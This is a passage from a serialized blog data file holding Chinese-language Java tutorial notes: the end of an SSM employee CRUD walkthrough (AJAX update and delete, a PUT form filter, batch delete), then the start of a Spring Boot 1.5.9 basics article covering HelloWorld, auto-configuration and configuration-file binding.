添加用户后需要跳转到最后一页，显示添加的数据。在分页时需要确保分页的插件显示的信息在合理的范围之内，需要对分页插件进行属性的配置。配置分页合理化参数。\n    \n    <plugins>\n        <plugin interceptor="com.github.pagehelper.pageinterceptor" >\n            <property name="reasonable" value="true"/>\n        </plugin>\n    </plugins>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# 更新员工信息\n\n 1. 前端发起ajax请求\n    \n    //点击更新，更新员工信息\n    $("#emp_update_btn").click(function(){\n        //验证邮箱是否合法\n        //1、校验邮箱信息\n        var email = $("#email_update_input").val();\n        var regemail = /^([a-z0-9_\\.-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})$/;\n        if(!regemail.test(email)){\n            show_validate_msg("#email_update_input", "error", "邮箱格式不正确");\n            return false;\n        }else{\n            show_validate_msg("#email_update_input", "success", "");\n        }\n    \n        //2、发送ajax请求保存更新的员工数据\n        $.ajax({\n            url:"${app_path}/emp/"+$(this).attr("edit-id"),\n            type:"put",\n            data:$("#empupdatemodal form").serialize(),\n            success:function(result){\n                //alert(result.msg);\n                //1、关闭对话框\n                $("#empupdatemodal").modal("hide");\n                //2、回到本页面\n                to_page(currentpage);\n            }\n        });\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    \n\n 2. 需要设置一个过滤器，用于将ajax请求中的数据封装到bean中\n    \n    \n    <filter>\n        <filter-name>httpputformcontentfilter</filter-name>\n        <filter-class>org.springframework.web.filter.httpputformcontentfilter</filter-class>\n    </filter>\n    \n    <filter-mapping>\n        <filter-name>httpputformcontentfilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 3. 后台编写处理请求的相关方法\n    \n    /**\n         * 如果直接发送ajax=put形式的请求\n         * 封装的数据\n         * employee\n         * [empid=1014, empname=null, gender=null, email=null, did=null]\n         *\n         * 问题：\n         * 请求体中有数据；\n         * 但是employee对象封装不上；\n         * update tbl_emp  where emp_id = 1014;\n         *\n         * 原因：\n         * tomcat：\n         * \t\t1、将请求体中的数据，封装一个map。\n         * \t\t2、request.getparameter("empname")就会从这个map中取值。\n         * \t\t3、springmvc封装pojo对象的时候。\n         * \t\t\t\t会把pojo中每个属性的值，request.getparamter("email");\n         * ajax发送put请求引发的血案：\n         * \t\tput请求，请求体中的数据，request.getparameter("empname")拿不到\n         * \t\ttomcat一看是put不会封装请求体中的数据为map，只有post形式的请求才封装请求体为map\n         * org.apache.catalina.connector.request--parseparameters() (3111);\n         *\n         * protected string parsebodymethods = "post";\n         * if( !getconnector().isparsebodymethod(getmethod()) ) {\n         success = true;\n         return;\n         }\n         *\n         *\n         * 解决方案；\n         * 我们要能支持直接发送put之类的请求还要封装请求体中的数据\n         * 1、配置上httpputformcontentfilter；\n         * 2、他的作用；将请求体中的数据解析包装成一个map。\n         * 3、request被重新包装，request.getparameter()被重写，就会从自己封装的map中取数据\n         * 员工更新方法\n         * @param employee\n         * @return\n         */\n    @responsebody\n    @requestmapping(value="/emp/{empid}",method=requestmethod.put)\n    public msg saveemp(employee employee, httpservletrequest request){\n        system.out.println("请求体中的值："+request.getparameter("gender"));\n        system.out.println("将要更新的员工数据："+employee);\n        employeeservice.updateemp(employee);\n        return msg.success()\t;\n    }\n    \n    /**\n    \t * 员工更新\n    \t * @param employee\n    \t */\n    public void updateemp(employee employee) {\n        // todo auto-generated method stub\n        employeemapper.updatebyprimarykeyselective(employee);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    \n\n\n# 删除员工信息\n\n 1. ajax发起删除员工请求\n    \n    //单个删除\n    $(document).on("click",".delete_btn",function(){\n        //1、弹出是否确认删除对话框\n        var empname = $(this).parents("tr").find("td:eq(2)").text();\n        var empid = $(this).attr("del-id");\n        //alert($(this).parents("tr").find("td:eq(1)").text());\n        if(confirm("确认删除【"+empname+"】吗？")){\n            //确认，发送ajax请求删除即可\n            $.ajax({\n                url:"${app_path}/emp/"+empid,\n                type:"delete",\n                success:function(result){\n                    alert(result.msg);\n                    //回到本页\n                    to_page(currentpage);\n                }\n            });\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    \n\n 2. 后端编写方法处理请求\n    \n    /**\n    \t * 单个批量二合一\n    \t * 批量删除：1-2-3\n    \t * 单个删除：1\n    \t * \n    \t * @param id\n    \t * @return\n    \t */\n    @responsebody\n    @requestmapping(value="/emp/{ids}",method=requestmethod.delete)\n    public msg deleteemp(@pathvariable("ids")string ids){\n        //批量删除\n        if(ids.contains("-")){\n            list<integer> del_ids = new arraylist<>();\n            string[] str_ids = ids.split("-");\n            //组装id的集合\n            for (string string : str_ids) {\n                del_ids.add(integer.parseint(string));\n            }\n            employeeservice.deletebatch(del_ids);\n        }else{\n            integer id = integer.parseint(ids);\n            employeeservice.deleteemp(id);\n        }\n        return msg.success();\n    }\n    \n    /**\n         * 员工删除\n         * @param id\n         */\n    public void deleteemp(integer id) {\n        // todo auto-generated method stub\n        employeemapper.deletebyprimarykey(id);\n    }\n    \n    public void deletebatch(list<integer> ids) {\n        // todo auto-generated method stub\n        employeeexample example = new employeeexample();\n        employeeexample.criteria criteria = example.createcriteria();\n        //delete from xxx where emp_id in(1,2,3)\n        criteria.andempidin(ids);\n        employeemapper.deletebyexample(example);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    \n\n 3. 设置批量删除员工ajax请求\n    \n    //完成全选/全不选功能\n    $("#check_all").click(function(){\n        //attr获取checked是undefined;\n        //我们这些dom原生的属性；attr获取自定义属性的值；\n        //prop修改和读取dom原生属性的值\n        $(".check_item").prop("checked",$(this).prop("checked"));\n    });\n    \n    //check_item\n    $(document).on("click",".check_item",function(){\n        //判断当前选择中的元素是否5个\n        var flag = $(".check_item:checked").length==$(".check_item").length;\n        $("#check_all").prop("checked",flag);\n    });\n    \n    //点击全部删除，就批量删除\n    $("#emp_delete_all_btn").click(function(){\n        //\n        var empnames = "";\n        var del_idstr = "";\n        $.each($(".check_item:checked"),function(){\n            //this\n            empnames += $(this).parents("tr").find("td:eq(2)").text()+",";\n            //组装员工id字符串\n            del_idstr += $(this).parents("tr").find("td:eq(1)").text()+"-";\n        });\n        //去除empnames多余的,\n        empnames = empnames.substring(0, empnames.length-1);\n        //去除删除的id多余的-\n        del_idstr = del_idstr.substring(0, del_idstr.length-1);\n        if(confirm("确认删除【"+empnames+"】吗？")){\n            //发送ajax请求删除\n            $.ajax({\n                url:"${app_path}/emp/"+del_idstr,\n                type:"delete",\n                success:function(result){\n                    alert(result.msg);\n                    //回到当前页面\n                    to_page(currentpage);\n                }\n            });\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    \n\n\n# 总结\n\n',charsets:{cjk:!0},lastUpdated:"2022/05/16, 15:55:31",lastUpdatedTimestamp:1652716531e3},{title:"Springboot1 基础篇",frontmatter:{title:"Springboot1 基础篇",date:"2022-04-28T03:11:00.000Z",permalink:"/dev/java/core/springbootbase",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["Springboot","Spring","SpringMVC"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/05.Springboot.html",relativePath:"01.开发/101.后端/1011.微服务核心/05.Springboot.md",key:"v-1a3c5af6",path:"/dev/java/core/springbootbase/",headers:[{level:2,title:"Springboot简介",slug:"springboot简介",normalizedTitle:"springboot简介",charIndex:31},{level:3,title:"微服务",slug:"微服务",normalizedTitle:"微服务",charIndex:407},{level:2,title:"HelloWorld",slug:"helloworld",normalizedTitle:"helloworld",charIndex:808},{level:2,title:"Springboot配置文件",slug:"springboot配置文件",normalizedTitle:"springboot配置文件",charIndex:7080},{level:3,title:"YAML语法",slug:"yaml语法",normalizedTitle:"yaml语法",charIndex:7218},{level:3,title:"配置文件值导入JavaBean",slug:"配置文件值导入javabean",normalizedTitle:"配置文件值导入javabean",charIndex:7641},{level:3,title:"其他获取值的方法",slug:"其他获取值的方法",normalizedTitle:"其他获取值的方法",charIndex:10780},{level:3,title:"配置文件注入值数据校验",slug:"配置文件注入值数据校验",normalizedTitle:"配置文件注入值数据校验",charIndex:11380},{level:3,title:"@PropertieSource",slug:"propertiesource",normalizedTitle:"@propertiesource",charIndex:11932},{level:3,title:"配置文件占位符",slug:"配置文件占位符",normalizedTitle:"配置文件占位符",charIndex:12519},{level:3,title:"profile多环境支持",slug:"profile多环境支持",normalizedTitle:"profile多环境支持",charIndex:12885},{level:3,title:"yml多文档块模式",slug:"yml多文档块模式",normalizedTitle:"yml多文档块模式",charIndex:13175},{level:3,title:"配置文件的加载",slug:"配置文件的加载",normalizedTitle:"配置文件的加载",charIndex:13390},{level:3,title:"自动配置原理",slug:"自动配置原理",normalizedTitle:"自动配置原理",charIndex:14437},{level:3,title:"Springboot的精髓",slug:"springboot的精髓",normalizedTitle:"springboot的精髓",charIndex:20574},{level:3,title:"@Conditional派生注解",slug:"conditional派生注解",normalizedTitle:"@conditional派生注解",charIndex:20769},{level:2,title:"日志",slug:"日志",normalizedTitle:"日志",charIndex:24083},{level:3,title:"SLF4J的使用方法",slug:"slf4j的使用方法",normalizedTitle:"slf4j的使用方法",charIndex:24967},{level:3,title:"日志的统一",slug:"日志的统一",normalizedTitle:"日志的统一",charIndex:25391},{level:3,title:"springboot的日志关系",slug:"springboot的日志关系",normalizedTitle:"springboot的日志关系",charIndex:25604},{level:3,title:"日志的使用方法",slug:"日志的使用方法",normalizedTitle:"日志的使用方法",charIndex:26354},{level:3,title:"日志配置文件",slug:"日志配置文件",normalizedTitle:"日志配置文件",charIndex:27762},{level:3,title:"切换日志框架为slf4j+log4j",slug:"切换日志框架为slf4j-log4j",normalizedTitle:"切换日志框架为slf4j+log4j",charIndex:29117},{level:3,title:"切换日志框架slf4j+log4j2",slug:"切换日志框架slf4j-log4j2",normalizedTitle:"切换日志框架slf4j+log4j2",charIndex:29834},{level:2,title:"Web开发",slug:"web开发",normalizedTitle:"web开发",charIndex:30393},{level:3,title:"Springboot对静态资源的处理",slug:"springboot对静态资源的处理",normalizedTitle:"springboot对静态资源的处理",charIndex:30482},{level:3,title:"Thymeleaf模板引擎",slug:"thymeleaf模板引擎",normalizedTitle:"thymeleaf模板引擎",charIndex:35212},{level:3,title:"SpringMVC自动配置",slug:"springmvc自动配置",normalizedTitle:"springmvc自动配置",charIndex:39578},{level:3,title:"修改Spingboot默认配置",slug:"修改spingboot默认配置",normalizedTitle:"修改spingboot默认配置",charIndex:44483},{level:3,title:"RestFulCRUD",slug:"restfulcrud",normalizedTitle:"restfulcrud",charIndex:44712},{level:3,title:"spring 错误处理机制",slug:"spring-错误处理机制",normalizedTitle:"spring 错误处理机制",charIndex:70444},{level:3,title:"嵌入式Web容器",slug:"嵌入式web容器",normalizedTitle:"嵌入式web容器",charIndex:77989},{level:3,title:"自动配置原理",slug:"自动配置原理-2",normalizedTitle:"自动配置原理",charIndex:14437},{level:3,title:"嵌入式Servlet容器启动原理",slug:"嵌入式servlet容器启动原理",normalizedTitle:"嵌入式servlet容器启动原理",charIndex:87334},{level:3,title:"使用外置的Servlet容器",slug:"使用外置的servlet容器",normalizedTitle:"使用外置的servlet容器",charIndex:90536},{level:3,title:"外置Servlet原理",slug:"外置servlet原理",normalizedTitle:"外置servlet原理",charIndex:91288},{level:2,title:"Springboot数据交互",slug:"springboot数据交互",normalizedTitle:"springboot数据交互",charIndex:95690},{level:3,title:"JDBC",slug:"jdbc",normalizedTitle:"jdbc",charIndex:24393},{level:3,title:"数据交互配置原理",slug:"数据交互配置原理",normalizedTitle:"数据交互配置原理",charIndex:97758},{level:3,title:"Druid数据源",slug:"druid数据源",normalizedTitle:"druid数据源",charIndex:100316},{level:3,title:"整合mybatis",slug:"整合mybatis",normalizedTitle:"整合mybatis",charIndex:104041},{level:3,title:"整合JPA",slug:"整合jpa",normalizedTitle:"整合jpa",charIndex:111898},{level:2,title:"Springboot 启动配置原理",slug:"springboot-启动配置原理",normalizedTitle:"springboot 启动配置原理",charIndex:115322},{level:3,title:"启动流程：",slug:"启动流程",normalizedTitle:"启动流程：",charIndex:115344},{level:3,title:"事件监听机制",slug:"事件监听机制",normalizedTitle:"事件监听机制",charIndex:118211},{level:2,title:"Springboot自定义starter",slug:"springboot自定义starter",normalizedTitle:"springboot自定义starter",charIndex:118377},{level:3,title:"步骤",slug:"步骤",normalizedTitle:"步骤",charIndex:118974}],headersStr:"Springboot简介 微服务 HelloWorld Springboot配置文件 YAML语法 配置文件值导入JavaBean 其他获取值的方法 配置文件注入值数据校验 @PropertieSource 配置文件占位符 profile多环境支持 yml多文档块模式 配置文件的加载 自动配置原理 Springboot的精髓 @Conditional派生注解 日志 SLF4J的使用方法 日志的统一 springboot的日志关系 日志的使用方法 日志配置文件 切换日志框架为slf4j+log4j 切换日志框架slf4j+log4j2 Web开发 Springboot对静态资源的处理 Thymeleaf模板引擎 SpringMVC自动配置 修改Spingboot默认配置 RestFulCRUD spring 错误处理机制 嵌入式Web容器 自动配置原理 嵌入式Servlet容器启动原理 使用外置的Servlet容器 外置Servlet原理 Springboot数据交互 JDBC 数据交互配置原理 Druid数据源 整合mybatis 整合JPA Springboot 启动配置原理 启动流程： 事件监听机制 Springboot自定义starter 步骤",content:'# SpringBoot 基础 - 基于 1.5.9\n\n\n# Springboot简介\n\nSpringboot是简化Spring应用开发的一个框架，其中整合了Spring技术栈，是J2EE开发的一站式解决方案。在传统的基于SSM框架进行项目开发的过程中，我们需要配置大量的配置文件，用于约束框架的功能和配置。Springboot基于“约定大于配置”的开发思想，各个组件的配置文件由Springboot帮助我们完成，我们只需要少量的配置即可搭建一个项目开发的基本环境，更专注于业务代码的编写。\n\n使用Springboot的优点：\n\n * 快速创建独立运行的Spring应用，并可以集成主流的框架\n * 使用嵌入式的Servlet容器，应用无需打War包\n * 使用starters进行自动依赖和版本控制\n * 主流框架的自动默认配置，无代码生成，开箱即用\n * 准生产环境的运行时监控\n * 天然集成云计算\n\n\n# 微服务\n\n> martinfowler.com\n\n微服务是当前项目开发的热点。回顾传统的单体应用开发，我们整个项目默认是部署在同一台服务器上的，我们将编写好的项目打成war包，放到tomcat中运行。在用户量较少、项目较为简单的场景下没有什么异常，部署起来也相对方便。但是如果项目的访问量较大，我们服务器的资源压力较大，单体应用就无法支撑起用户的需求。在这种情况下，我们通常会将项目部署在多个服务器上，然后使用负载均衡将用户的访问分配到不同的服务器上。那么，如果只是单个功能访问量较大，比如：订单功能、会员功能，这种方式就会导致服务器的资源浪费。微服务的思想应运而生。\n\n\n\n所谓微服务，就是将原本的单体应用抽离出多个功能模块，每个功能模块都可以单独部署。如果某个模块的访问要求较高，将不同模块之间的动态组合，部署到其他服务器上。每个功能模块都是可以独立替换和独立升级的单元。如下图所示：\n\n\n\n\n# HelloWorld\n\n# helloworld编写\n\n> 浏览器发送hello请求，服务器接收请求并将helloworld返回给浏览器。\n\n 1. 创建Maven工程，并导入springboot相关依赖。\n    \n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>1.5.9.RELEASE</version>\n    </parent>\n    \n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n    </dependencies>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 2. 编写主程序，用于启动springboot应用\n    \n    package com.pwddd;\n    \n    import org.springframework.boot.SpringApplication;\n    import org.springframework.boot.autoconfigure.SpringBootApplication;\n    \n    @SpringBootApplication\n    public class SpringBootTestApplication {\n        public static void main(String[] args) {\n            SpringApplication.run(SpringBootTestApplication.class,args);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 3. 编写controller处理用户请求\n    \n    package com.pwddd.controller;\n    \n    import org.springframework.stereotype.Controller;\n    import org.springframework.web.bind.annotation.GetMapping;\n    import org.springframework.web.bind.annotation.ResponseBody;\n    \n    @Controller\n    public class HelloController {\n    \n        @GetMapping("/hello")\n        @ResponseBody\n        public String hello(){\n            return "helloworld";\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 4. 运行主程序\n\n 5. Springboot应用打包\n    \n    * 导入Springboot项目插件\n      \n      <build>\n          <plugins>\n              <plugin>\n                  <groupId>org.springframework.boot</groupId>\n                  <artifactId>spring-boot-maven-plugin</artifactId>\n              </plugin>\n          </plugins>\n      </build>\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n    \n    * 运行maven -> package\n    \n    * java -jar运行\n\n# helloworld解析\n\n# 父项目版本仲裁\n\n在创建Maven项目中，指定了Maven的父项目。\n\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>1.5.9.RELEASE</version>\n</parent>\n\n\n1\n2\n3\n4\n5\n\n\n该父项目又指定了另一个父项目。\n\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-dependencies</artifactId>\n    <version>1.5.9.RELEASE</version>\n    <relativePath>../../spring-boot-dependencies</relativePath>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n这个父项目中制定了相关组件的版本。\n\n<properties>\n    \x3c!-- Dependency versions --\x3e\n    <activemq.version>5.14.5</activemq.version>\n    <antlr2.version>2.7.7</antlr2.version>\n    …………\n\n\n1\n2\n3\n4\n5\n\n\n# 场景启动器\n\nspringboot starter是springboot的场景启动器，帮我们导入了相关模块运行的相关依赖。springboot将常见的功能场景抽离出来，我们使用时只需要引用相关的场景启动器，springboot会帮我们自动导入相关的依赖。\n\n# springboot应用的启动\n\n在Springboot启动类上有@SpringBootApplication注解，该注解说明了该类是当前项目的主配置类，springboot项目可以运行该类的main方法启动项目。该注解是一个组合注解，又包含了以下的内容。\n\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\n@SpringBootConfiguration\n@EnableAutoConfiguration\n@ComponentScan(\n    excludeFilters = {@Filter(\n    type = FilterType.CUSTOM,\n    classes = {TypeExcludeFilter.class}\n), @Filter(\n    type = FilterType.CUSTOM,\n    classes = {AutoConfigurationExcludeFilter.class}\n)}\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n@SpringBootConfiguration注解，标注springboot的配置类。\n\n@EnableAutoConfiguration注解，开启了自动配置的功能。之前在使用SSM框架时，需要自己导入相关的依赖和配置，开启自动配置之后就可以自动完成相关配置。\n\n在该注解中，包含了以下的注解内容：\n\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\n@AutoConfigurationPackage\n@Import({EnableAutoConfigurationImportSelector.class})\npublic @interface EnableAutoConfiguration {\n    String ENABLED_OVERRIDE_PROPERTY = "spring.boot.enableautoconfiguration";\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n@AutoConfigurationPackage: 自动配置包\n\n自动配置包由如下的注解组成：\n\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\n@Import({Registrar.class})\npublic @interface AutoConfigurationPackage {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n@Import({Registrar.class}): Import是Spring底层的注解，该注解给容器中导入一个组件。导入组件由Registrar定义。该类将Application主配置类所在包下的所有子包中的组件添加扫描到Spring容器中。\n\n public void registerBeanDefinitions(AnnotationMetadata metadata, BeanDefinitionRegistry registry) {\n            AutoConfigurationPackages.register(registry, (new AutoConfigurationPackages.PackageImport(metadata)).getPackageName());\n        }\n\n\n1\n2\n3\n\n\nEnableAutoConfigurationImportSelector：自动配置导入的选择器。将所有需要导入的组件以全类名的方式返回，这些组件就会被添加到容器中。\n\npublic String[] selectImports(AnnotationMetadata annotationMetadata) {\n    if (!this.isEnabled(annotationMetadata)) {\n        return NO_IMPORTS;\n    } else {\n        try {\n            AutoConfigurationMetadata autoConfigurationMetadata = AutoConfigurationMetadataLoader.loadMetadata(this.beanClassLoader);\n            AnnotationAttributes attributes = this.getAttributes(annotationMetadata);\n            List<String> configurations = this.getCandidateConfigurations(annotationMetadata, attributes);\n            configurations = this.removeDuplicates(configurations);\n            configurations = this.sort(configurations, autoConfigurationMetadata);\n            Set<String> exclusions = this.getExclusions(annotationMetadata, attributes);\n            this.checkExcludedClasses(configurations, exclusions);\n            configurations.removeAll(exclusions);\n            configurations = this.filter(configurations, autoConfigurationMetadata);\n            this.fireAutoConfigurationImportEvents(configurations, exclusions);\n            return (String[])configurations.toArray(new String[configurations.size()]);\n        } catch (IOException var6) {\n            throw new IllegalStateException(var6);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n其中Configuration中就包含了组件的全类名，由this.getCandidateConfigurations(annotationMetadata, attributes);方法获取，该方法中调用了SpringFactoriesLoader.loadFactoryNames。从配置文件中获取了全类名。\n\nEnumeration<URL> urls = classLoader != null ? classLoader.getResources("META-INF/spring.factories") : ClassLoader.getSystemResources("META-INF/spring.factories");\n\n\n1\n\n\nSpringboot在启动的时候从类路径下的META-INF/spring.factories中获取EnableAutoConfiguration指定的值，将这些值作为自动配置类导入到容器中，自动配置类就生效，帮我们进行自动配置工作。\n\n\n# Springboot配置文件\n\nspringboot中有两种类型的配置文件：application.properties和application.yml。\n\n配置文件的作用：Springboot在底层做好了组件的基本配置，当我们想要自定义配置时，就需要定义配置文件。\n\n\n# YAML语法\n\n# 基本语法\n\nYAML是基于键值对的语法模式，使用空格完成层级的缩进，只要是对齐的空格数，就认为是同一层级的。YAML相对于XML配置文件，更加关注数据。基本样式如下：\n\nserver:\n  port: 8081\n\n\n1\n2\n\n\n# 值语法\n\n字面量：k: v字面量可以直接写，字符串默认不加单引号或者双引号。双引号不会转义字符串里面的特殊字符。而使用单引号会对特殊字符进行转义。\n\n对象、Map：\n\n# 对象、map的写法\nfriends:\n\tlastName: zhangsan\n\tage: 20\n\t\n# 对象、map的行内写法\nfriends: {lastName: zhangsan,age: 18}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n数组：\n\n# 数组的写法\npets:\n - cat\n - dog\n - pig\n# 数组的行内写法\npets: [cat,dog,pig]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 配置文件值导入JavaBean\n\njavaBean\n\npackage com.pwddd.springboot.bean;\n\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.stereotype.Component;\n\nimport java.util.List;\nimport java.util.Map;\n\n@ConfigurationProperties(prefix = "person")\n@Component\npublic class Person {\n\n    private String name;\n    private Integer age;\n    private boolean boss;\n    private Map<String,String> maps;\n    private List<String> lists;\n    private Dog dog;\n\n    @Override\n    public String toString() {\n        return "Person{" +\n                "name=\'" + name + \'\\\'\' +\n                ", age=" + age +\n                ", boss=" + boss +\n                ", maps=" + maps +\n                ", lists=" + lists +\n                ", dog=" + dog +\n                \'}\';\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n\n    public boolean isBoss() {\n        return boss;\n    }\n\n    public void setBoss(boolean boss) {\n        this.boss = boss;\n    }\n\n    public Map<String, String> getMaps() {\n        return maps;\n    }\n\n    public void setMaps(Map<String, String> maps) {\n        this.maps = maps;\n    }\n\n    public List<String> getLists() {\n        return lists;\n    }\n\n    public void setLists(List<String> lists) {\n        this.lists = lists;\n    }\n\n    public Dog getDog() {\n        return dog;\n    }\n\n    public void setDog(Dog dog) {\n        this.dog = dog;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n\n\npackage com.pwddd.bean;\n\npublic class Dog {\n    private String name;\n    private Integer age;\n\n    @Override\n    public String toString() {\n        return "Dog{" +\n                "name=\'" + name + \'\\\'\' +\n                ", age=" + age +\n                \'}\';\n    }\n\n    public Dog() {\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n添加配置处理器，用来提示配置文件\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n编写配置文件\n\nperson:\n  name: zhangsan\n  age: 12\n  maps: {zhangsan: aaa,lisi: bbb}\n  lists:\n    - zhangsan\n    - lisi\n  dog:\n    name: zhangsan\n    age: 12\n\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n编写测试\n\n@SpringBootTest\nclass SpringbootApplicationTests {\n\n    @Autowired\n    Person person;\n\n    @Test\n    public void testProperties(){\n        System.out.println(person);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 其他获取值的方法\n\n//@ConfigurationProperties(prefix = "person")\n@Component\npublic class Person {\n\n    private String name;\n    @Value("${person.age}")\n    private Integer age;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nConfigurationProperties和Value的区别：\n\n             @CONFIGURATIONPROPERTIES   @VALUE\n功能           批量注入配置文件中的属性               一个个指定\n松散绑定（松散语法）   支持                         不支持\nSpEL         不支持                        支持\nJSR303数据校验   支持                         不支持\n复杂类型封装       支持                         不支持\n\n如果说，我们只是在某个业务逻辑中需要获取一下配置文件中的某项值，使用@Value。如果说，我们专门编写了一个javaBean来和配置文件进行映射，我们就直接使用@ConfigurationProperties。\n\n\n# 配置文件注入值数据校验\n\n@Component\n@ConfigurationProperties(prefix = "person")\n@Validated\npublic class Person {\n/**\n* <bean class="Person">\n* <property name="lastName" value="字面量/${key}从环境变量、配置文件中获取值/#\n{SpEL}"></property>\n* <bean/>\n*/\n//lastName必须是邮箱格式\n@Email\n//@Value("${person.last‐name}")\nprivate String lastName;\n//@Value("#{11*2}")\nprivate Integer age;\n//@Value("true")\nprivate Boolean boss;\nprivate Date birth;\nprivate Map<String,Object> maps;\nprivate List<Object> lists;\nprivate Dog dog;\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# @PropertieSource\n\n@PropertieSource:加载指定的配置文件。默认从全局配置文件中加载配置，如果需要指定其他的配置文件的位置，就可以使用该注解。\n\n@ImportResource：导入Spring的配置文件，让配置文件里面的内容生效。SpringBoot里面没有Spring的配置文件，我们自己编写的配置文件，也不能自动识别。想让Spring的配置文件生效，加载进来。\n\n@ImportResource(locations = {"classpath:beans.xml"})\n//导入Spring的配置文件让其生效\n\n\n1\n2\n\n\nSpringBoot推荐给容器中添加组件的方式，推荐使用全注解的方式。\n\n 1. 配置类添加@Configuration注解，指明当前类是一个配置类。\n\n 2. 使用@Bean给容器中添加组件\n\npackage com.pwddd.springboot.config;\n\nimport org.springframework.context.annotation.Configuration;\n\n@Configuration\npublic class MyAppConfig {\n//将方法的返回值添加到容器中；容器中这个组件默认的id就是方法名\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 配置文件占位符\n\n# 